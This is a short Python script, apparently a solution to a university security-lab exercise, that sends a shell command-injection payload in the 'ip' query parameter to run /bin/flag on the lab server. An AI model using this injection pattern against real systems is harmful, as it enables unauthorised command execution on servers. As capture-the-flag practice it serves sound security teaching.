import requests
session = requests.Session()
response = session.get("https://t6.itsec.sec.in.tum.de/api?ip=8.8.8.8%27;%20/bin/flag;%20echo%20%27")
print(response.text)